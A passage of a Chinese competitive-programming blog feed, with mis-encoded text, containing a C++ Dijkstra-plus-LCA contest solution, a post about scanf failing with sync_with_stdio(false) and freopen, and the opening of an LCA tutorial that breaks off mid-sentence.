class="meta-keyword">define</span> INF 0x3f3f3f3f3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> head[maxn],dis[maxn][<span class="number">30</span>],cnt,n,m;</span><br><span class="line"><span class="keyword">int</span> vis1[maxn];</span><br><span class="line"><span class="keyword">int</span> vis2[maxn];</span><br><span class="line"><span class="keyword">int</span> d[maxn];</span><br><span class="line">priority_queue&lt;P,vector&lt;P&gt;,greater&lt;P&gt; &gt; p;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal_c</span><span class="params">(<span class="keyword">int</span> child,<span class="keyword">int</span> ancestor)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(child&gt;ancestor)&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        child&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].next=head[x];</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    head[x]=cnt;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">    p.<span class="built_in">push</span>(&#123;<span class="number">0</span>,root&#125;);</span><br><span class="line">    d[root]=<span class="number">0</span>;</span><br><span class="line">    vis2[root]=root;</span><br><span class="line">    <span class="keyword">while</span>(!p.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=p.<span class="built_in">top</span>();</span><br><span class="line">        p.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> point=x.second;</span><br><span class="line">        <span class="keyword">if</span>(vis1[point]==root)<span class="keyword">continue</span>;</span><br><span class="line">        vis1[point]=root;</span><br><span class="line">        dis[point][<span class="built_in">cal_c</span>(point,root)]=d[point];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=head[point];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(to&lt;root)<span class="keyword">continue</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(vis2[to]!=root)&#123;</span><br><span class="line">                d[to]=INF;</span><br><span class="line">                vis2[to]=root;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span>(d[point]+edge[i].w&lt;d[to])&#123;</span><br><span class="line">                d[to]=d[point]+edge[i].w;</span><br><span class="line">                p.<span class="built_in">push</span>(&#123;d[to],to&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(a!=b)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a&gt;b)a&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> b&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis)); </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">dijkstra</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> q;</span><br><span class="line">    cin&gt;&gt;q;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="keyword">int</span> lca=<span class="built_in">LCA</span>(x,y);</span><br><span class="line">        <span class="keyword">int</span> lx=<span class="built_in">cal_c</span>(x,lca),ly=<span class="built_in">cal_c</span>(y,lca);</span><br><span class="line">        <span class="keyword">int</span> ans=INF;</span><br><span class="line">        <span class="keyword">while</span>(lca)&#123;</span><br><span class="line">            ans=<span class="built_in">min</span>(ans,dis[x][lx]+dis[y][ly]);</span><br><span class="line">            lx++,ly++;</span><br><span class="line">            lca&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ans==INF)<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è’Ÿè’»çš„æäº¤è®°å½•ã€‚</p><p><a href="https://codeforces.com/gym/103055/problem/D">æµ‹è¯„ç½‘ç«™</a></p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/4.png" alt="8"></p><p>è‡³äºè¸©çš„é‚£å‡ ä¸ªå‘å˜›ï¼Œå°±æ˜¯ $long long$ çš„é—®é¢˜äº†ï¼Œç„¶åè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯è¾“å…¥çš„é—®é¢˜ï¼Œè¿™ä¸ªå…·ä½“çœ‹æˆ‘ä¸Šä¸€ç¯‡åšå®¢å§ï¼Œæˆ‘åˆ°ç°åœ¨è¿˜æ²¡å¤ªå¼„æ‡‚ï¼Œä¸è¿‡è‡³å°‘èƒ½æ³¨æ„è§„é¿çš„æŠ€å·§äº†ï¼šé‚£å°±æ˜¯åƒä¸‡åˆ«åœ¨å¼€</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>çš„æƒ…å†µä¸‹ç”¨ $scanf$ å»è¯»å– $long long$ æ•°æ®ï¼Œä¸ç„¶ä½ ä¼šæ€€ç–‘äººç”Ÿã€‚</p><p>å¸Œæœ›è¿™æ¬¡çœèµ›èƒ½è¶…è¶Šä¸Šæ¬¡çš„è‡ªå·±å§ï¼Œ$xia0ji233,fightingï¼ï¼ï¼$</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> LCA </category>
          
          <category> æœ€çŸ­è·¯å¾„ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++æ–‡ä»¶çš„è¾“å…¥è¾“å‡ºé—®é¢˜</title>
      <link href="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©å†™è¿™ç¯‡åšå®¢çº¯ç²¹å°±æ˜¯é‡åˆ°ç‚¹é—®é¢˜ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰äººé‡åˆ°è¿‡ã€‚</p><span id="more"></span><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æœ€è¿‘æ‰“CFçš„æ—¶å€™å‘ç°äº¤ä¸Šå»ä¸€ä¸ªç­”æ¡ˆå‘ç”Ÿäº†éé¢„æœŸé€€å‡ºï¼Œè€Œä¸”æ˜¯åœ¨æ ·ä¾‹é‡Œé¢å‘ç”Ÿçš„ï¼Œäºæ˜¯æˆ‘èµ¶ç´§æŠŠç¨‹åºæ‰’ä¸‹æ¥æœ€å¤§é™åº¦åœ°ç¡®å®šå‡ºç°é—®é¢˜çš„ä»£ç æ®µï¼Œæœ€ç»ˆå‡ºç°äº†ä»¥ä¸‹ä»£ç å†™çš„ç¨‹åºã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> q;</span><br><span class="line">    cin&gt;&gt;q;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> s,t;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld&quot;</span>,&amp;s,&amp;t);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s=%lld t=%lld\n&quot;</span>,s,t); </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¸‡èƒ½å¤´æ–‡ä»¶ï¼Œç„¶åæˆ‘æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶æŠŠæ ‡å‡†è¾“å…¥æµé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”å…³é—­äº† $cin$ å’Œ $cout$ çš„åŒæ­¥æµï¼Œå¤§æ¦‚ç‡é—®é¢˜æ˜¯å‡ºåœ¨è¿™é‡Œçš„ï¼Œç„¶åå°±ä¸€äº›å¸¸è§„æ“ä½œæ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚</p><p>æˆ‘çš„ $1.in$ çš„æ–‡ä»¶å†…å®¹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt="1"></p><p>æ˜¯æ­£å¸¸çš„è¾“å…¥æ•°æ®ï¼Œå¹¶ä¸”æ–‡ä»¶ç¼–ç ä¸º $UTF-8$ æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚</p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>é‚£ä¹ˆæˆ‘ä»¬å¼€ $DEV$ è¿è¡Œä»¥ä¸‹å…ˆã€‚</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/2.png" alt="2"></p><p>å¯ä»¥çœ‹åˆ°ç¨‹åºè¿è¡Œå‡ºç°äº†éé¢„æœŸç»“æœã€‚</p><p>ç”±äº $DEV$ ä¸æ–¹ä¾¿è°ƒè¯•æˆ‘ä»¬ä¾¿æŠŠ $IDE$ æ¢æˆäº† $VScode$ ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬åœ¨ $scanf$ å’Œ $printf$ åˆ†åˆ«æ‰“ä¸€ä¸ªæ–­ç‚¹ï¼Œç„¶åå¼€å¯è°ƒè¯•æ¨¡å¼ã€‚</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/3.png" alt="3"></p><p>è¿™é‡Œ $s$ å’Œ $t$ æ˜¯éšæœºå€¼æ­£å¸¸ï¼Œå› ä¸ºæˆ‘ä»¬å¹¶æ²¡æœ‰åˆå§‹åŒ– $s$ å’Œ $t$ ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ $F10$ æ­¥è¿‡çœ‹çœ‹ç»“æœã€‚</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/4.png" alt="4"></p><p>è¿‡äº† $scanf$ å´æ²¡æœ‰æˆåŠŸè¯»å…¥æ•°æ®ï¼ï¼ï¼è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ</p><p>æˆ‘å¼€å§‹å°è¯•æ‰¾ä¸åŒçš„åŸå› ï¼ŒåŸå› 1å°±æ˜¯æ€€ç–‘æ–‡ä»¶è¯»å…¥çš„é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ³¨é‡Šé‡å®šå‘é‚£ä¸€è¡Œæµ‹è¯•çœ‹çœ‹ã€‚</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/5.png" alt="5"></p><p>è¿è¡Œç»“æœæ˜¯æ­£å¸¸çš„ï¼Œè¿™ä¹ˆçœ‹æ¥é—®é¢˜ä¼¼ä¹è§£å†³äº†ã€‚</p><p>ä½†æ˜¯æäº¤ç»™ojæ˜¯å®å®åœ¨åœ¨åœ°æŠ¥é”™äº†ï¼Œå› æ­¤æˆ‘ä»¬å°è¯•æ³¨é‡Šå…¶å®ƒä»£ç çœ‹çœ‹æƒ…å†µï¼Œè¿™é‡Œæˆ‘ä»¬æ¥ç€é€‰æ‹©æ³¨é‡Šè¿™ä¸ªå…³é—­åŒæ­¥æµçš„ä»£ç ã€‚</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/6.png" alt="6"></p><p>è¿™å›å±…ç„¶æ­£å¸¸è¯»å…¥äº†æ•°æ®ï¼ä»€ä¹ˆé¬¼ï¼Ÿ</p><p>å› ä¸ºåˆšåˆšæˆ‘æŠŠ $freopen$ æ³¨é‡Šäº†æ˜¯ç¡®ç¡®å®å®è¯»å…¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜äº†ï¼Œä½†æ˜¯ç°åœ¨ä¼¼ä¹æŠŠ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>ç»™å…³é—­äº†ç¨‹åºä¹Ÿæ˜¯èƒ½æ­£å¸¸è¿›è¡Œçš„ã€‚</p><p>è€Œä¸”è¿™é‡Œæˆ‘è¿˜æµ‹è¯•äº†ç¬¬ä¸‰ç§æƒ…å†µï¼šä¸¤è€…éƒ½æ‰“å¼€ï¼ŒæŠŠ $long long$ æ¢å› $int$ ç±»å‹ã€‚</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/7.png" alt="7"></p><p>å±…ç„¶ä¹Ÿæ˜¯æ­£å¸¸è¯»å…¥ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰“å¼€æ–‡ä»¶ï¼Œåœ¨å…³é—­åŒæ­¥æµçš„æƒ…å†µä¸‹ä½¿ç”¨ $scanf$ è¯»å…¥ $long long$ æ•°æ®ç±»å‹ä¼šå¯¼è‡´è¯»å…¥ä¸æˆåŠŸï¼Œè€Œä¸”æ³¨é‡Šäº†æ‰“å¼€æ–‡ä»¶æäº¤ç»™ oj æµ‹è¯„è¿”å›äº†é”™è¯¯ç»“æœã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æˆ‘ä¸ªäººæ„Ÿè§‰å¯èƒ½æ¶‰åŠåˆ°åº•å±‚çš„ä¸€äº›é—®é¢˜äº†ã€‚å› ä¸ºè‡ªå·±æµ‹è¯•ç¡®å®ä¸‰ç§æƒ…å†µåŒæ—¶æ»¡è¶³ä¼šå¯¼è‡´è¯»å…¥æ•°æ®å¤±è´¥ã€‚è¿™ä¸‰ç§æƒ…å†µåˆ†åˆ«æ˜¯</p><ol><li>é‡å®šå‘ $stdin$ åˆ°ä¸€ä¸ªæ–‡ä»¶</li><li>å…³é—­IOåŒæ­¥æµ</li><li>ç”¨ $scanf$ è¯»å…¥ $long long$ æ•°æ®</li></ol><p>ä¸€èˆ¬æ¥è¯´ï¼Œ$scanf$ ä¸æ¥æ”¶åˆ° $EOF$ ä¿¡å·æ˜¯ä¼šä¸€ç›´ç­‰å¾…ä½ è¾“å…¥çš„ã€‚å¸¸è§çš„ $EOF$ åŸºæœ¬å°±æ˜¯è¯»åˆ°æ–‡ä»¶å°¾ï¼Œæˆ–è€…æ‰‹åŠ¨ç»™ç»ˆç«¯äº†ä¸€ä¸ª $Ctrl + Z$ ä¿¡å·ç»™ç¨‹åºï¼Œè¿™åº”è¯¥ç®—å¤–éƒ¨ä¸­æ–­äº†ã€‚å°±åŸºæœ¬ä¸ä¼šé‡åˆ° $scanf$ è¯»å…¥å¤±è´¥çš„æƒ…å†µã€‚è¦çœŸçš„èƒ½æœ‰è¿™ä¹ˆå¥½æ•°æ®é‚£ä¸æ˜¯å¯ä»¥éšä¾¿æ³„éœ²ï¼Ÿå¦‚æœä¸Šä¸€ä¸ªæ ˆå¸§ä¿å­˜çš„ä¸€äº›å˜é‡çš„åœ°å€åˆšå¥½åœ¨è¿™ï¼Œæˆ‘è¿™é‡Œæ•…æ„è¯»å…¥å¤±è´¥é‚£å°±ç›´æ¥æ³„éœ²åœ°å€ï¼Œæˆ‘æ²¡è§è¿‡è¿™æ ·çš„æƒ…å†µã€‚</p><p>å½“ç„¶æˆ‘æ¯”è¾ƒæµ…è–„ï¼Œåªèƒ½çœ‹åˆ°è¡¨é¢ä¸Šçš„ä¸€äº›ä¸œè¥¿ï¼Œå¦‚æœä½ æœ‰æ·±å±‚æ¬¡ç‚¹çš„åˆç†çš„è§£é‡Šéº»çƒ¦ä½ ä¹Ÿè”ç³»æˆ‘ï¼Œæˆ‘ä¹Ÿä¸æƒ³å°±åœ¨è¿™é‡Œç•™ä¸€ä¸ªé”™è¯¯çš„ç»“è®ºï¼ŒæœŸå¾…è¿™ä¸ªé—®é¢˜èƒ½æ—©ç‚¹è§£å†³ã€‚</p><p>ä¸‹é¢æˆ‘ä¹Ÿç»™å‡ºä»¥ä¸‹æœ¬æ¬¡å®éªŒç”¨åˆ°çš„<a href="broken.zip">é™„ä»¶</a>ä¾›å¤§å®¶æµ‹è¯•ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> stdin </category>
          
          <category> stdout </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æœ€è¿‘å…¬å…±ç¥–å…ˆæ±‚è§£</title>
      <link href="/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘æ¥å¤ä¹ ä¸€éå›¾è®ºçš„æ¿å­â€”â€”LCAã€‚</p><span id="more"></span><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p><strong>æœ€è¿‘å…¬å…±ç¥–å…ˆ</strong>ï¼ˆè‹±è¯­ï¼šlowest common ancestorï¼‰æ˜¯æŒ‡åœ¨ä¸€ä¸ª<a href="https://zh.wikipedia.org/wiki/%E6%A0%91_(%E5%9B%BE%E8%AE%BA)">æ ‘</a>æˆ–è€…<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE">æœ‰å‘æ— ç¯å›¾</a>ä¸­åŒæ—¶æ‹¥æœ‰<em>v</em>å’Œ<em>w</em>ä½œä¸ºåä»£çš„æœ€æ·±çš„èŠ‚ç‚¹ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿæ˜¯å…¶è‡ªå·±çš„åä»£ï¼Œå› æ­¤å¦‚æœ<em>v</em>æ˜¯<em>w</em>çš„åä»£ï¼Œé‚£ä¹ˆ<em>w</em>å°±æ˜¯<em>v</em>å’Œ<em>w</em>çš„æœ€è¿‘å…¬å…±ç¥–å…ˆã€‚(fron wiki)</p><h3 id="ç®—æ³•è®¾è®¡"><a href="#ç®—æ³•è®¾è®¡" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h3><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹åº”è¯¥æ€ä¹ˆè§£å†³æ­¤ç±»é—®é¢˜ã€‚</p><h4 id="ä¸€èˆ¬æ€è·¯"><a href="#ä¸€èˆ¬æ€è·¯" class="headerlink" title="ä¸€èˆ¬æ€è·¯"></a>ä¸€èˆ¬æ€è·¯</h4><p>åœ¨ä¸€ä¸ªæ ‘ä¸Šï¼Œæˆ‘ä»¬å®šä¹‰ç¦»æ ¹èŠ‚ç‚¹æœ€è¿œçš„ä¸a,bç›¸åŒçš„ç¥–å…ˆä¸ºæœ€è¿‘å…¬å…±ç¥–å…ˆ(LCA)ã€‚æˆ‘ä»¬éœ€è¦æ€ä¹ˆåšå‘¢ï¼Œé¦–å…ˆè‚¯å®šæ˜¯ dfs è·‘ä¸€éï¼ŒæŠŠæ‰€æœ‰çš„ç‚¹çš„å±‚æ¬¡éå†å‡ºæ¥ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(N)$ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ $LCA$ é—®é¢˜ä¼šæœ‰å¤šæ¬¡è¯¢é—®ï¼Œè¯¢é—®æ¬¡æ•°ä¸€èˆ¬ä¸º $q&lt;10^5$ ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½åœ¨çº¿æ€§æ—¶é—´å†…å»è®¡ç®— $LCA$ï¼Œå¦‚æœé‡‡å–æœ€æœ´ç´ çš„æ–¹æ³•ï¼šé€‰å®š2ä¸ªç‚¹ï¼Œè‹¥æ·±åº¦ä¸ä¸€æ ·åˆ™å…ˆè½¬ä¸ºæ·±åº¦ä¸€æ ·ï¼Œæ·±åº¦è¾ƒæ·±çš„ç‚¹ä¸åœæ±‚å®ƒçš„çˆ¶äº²èŠ‚ç‚¹ç›´åˆ°æ·±åº¦ä¸€æ ·ï¼Œç„¶åç”¨å¦‚ä¸‹ä»£ç å»æ±‚è§£ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(a!=b)&#123;</span><br><span class="line">        a=pre[a];</span><br><span class="line">        b=pre[b];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å½“ç„¶å¯ä»¥ï¼Œè€Œä¸”éå¸¸ç¬¦åˆæœ€è¿‘å…¬å…±ç¥–å…ˆçš„å®šä¹‰ï¼Œåªæ˜¯åªéœ€è¦ç¨å¾®æ„é€ ä¸€ä¸‹æ•°æ®å°±å¯ä»¥ $T$ åˆ°é£èµ·ã€‚</p><h4 id="æ­£ç¡®æ€è·¯"><a href="#æ­£ç¡®æ€è·¯" class="headerlink" title="æ­£ç¡®æ€è·¯"></a>æ­£ç¡®æ€è·¯</h4><p>æœ‰ä¸€ç‚¹ä¸éš¾å‘ç°ï¼šå¦‚æœæˆ‘å’Œä½ æœ‰ä¸€ä¸ªå…¬å…±ç¥–å…ˆï¼Œåˆ™å…¬å…±ç¥–å…ˆçš„ç¥–å…ˆä¸€å®šä¹Ÿæ˜¯æˆ‘ä»¬çš„å…¬å…±ç¥–å…ˆã€‚æ¯”å¦‚äº²å…„å¼Ÿä¹‹é—´ï¼Œå®ƒä»¬çš„å…¬å…±ç¥–å…ˆå°±æ˜¯å®ƒä»¬çš„çˆ¶æ¯ï¼ˆè¿™é‡Œæˆ‘ä»¬å‡è®¾çˆ¶æ¯æ˜¯ä¸€ä¸ªäººï¼Œçˆ·çˆ·å¥¶å¥¶å§¥å§¥å§¥çˆ·ç­‰ä¹Ÿæ˜¯ä¸€ä¸ªäººï¼‰ï¼Œçˆ¶æ¯çš„ç¥–å…ˆä¹Ÿå°±æ˜¯çˆ·çˆ·å¥¶å¥¶å®ƒä»¬åŒæ ·ä¹Ÿæ˜¯è¿™äº²å…„å¼Ÿçš„å…¬å…±ç¥–å…ˆã€‚å†æœ‰ä¸€ä¸ªï¼Œå¦‚æœæˆ‘ä»¬ä¸¤ä¸ªäººçš„çˆ¶äº²ä¸ç›¸åŒï¼Œåˆ™æˆ‘ä»¬çš„å…¬å…±ç¥–å…ˆä¹Ÿç­‰äºæˆ‘ä»¬çˆ¶äº²ä¹‹é—´çš„å…¬å…±ç¥–å…ˆï¼Œè¿™ä¸ªéƒ½æ˜¯èƒ½ç›´æ¥å¾—åˆ°çš„ç»“è®ºã€‚é‚£ä¹ˆå®ƒåœ¨ä¸€å®šæ„ä¹‰ä¸Šæ˜¯æœ‰åºçš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥é‡‡ç”¨å€å¢+äºŒåˆ†çš„æ€è·¯ã€‚</p><p>å‡è®¾ $fa[a][k]$ ä¸ºå·® $a$ ç‚¹ $2^k$ è¾ˆçš„ç¥–å…ˆï¼Œ$fa[a][0]$ å°±è¡¨ç¤º $a$ çš„çˆ¶äº²ã€‚åœ¨æœç´¢çš„æ—¶å€™æˆ‘ä»¬å…ˆè§‚å¯ŸèŠ‚ç‚¹æ‰€åœ¨çš„æ·±åº¦ç„¶åå–å¾—ç¦»ä»–ä»¬æœ€è¿œçš„å…¬å…±ç¥–å…ˆã€‚ä¹Ÿå°±æ˜¯ $fa[a][log_2deep[a]]$ </p><p>ä½†æ˜¯ä½ å¯èƒ½ä¼šå‘ç°ï¼Œå¦‚æœæ·±åº¦ä¸º7ï¼Œé‚£ä¹ˆå®ƒæœ€å¤šåªèƒ½å¾€ä¸Šæ‰¾ $4$ ä¸ªç¥–å…ˆï¼Œè€Œå¦‚æœå…¬å…±ç¥–å…ˆåˆšå¥½æ˜¯æ ¹èŠ‚ç‚¹ï¼Œé‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿé‚£ä¹ˆæˆ‘ä»¬ä¸é€‰æ‹©ç¼©å°åŒºé—´ï¼Œè€Œæ˜¯æŠŠ $a,b$ å½“æˆæ–°çš„å¯¹è±¡æ¥ç®—å…¬å…±ç¥–å…ˆã€‚é‚£ä½ 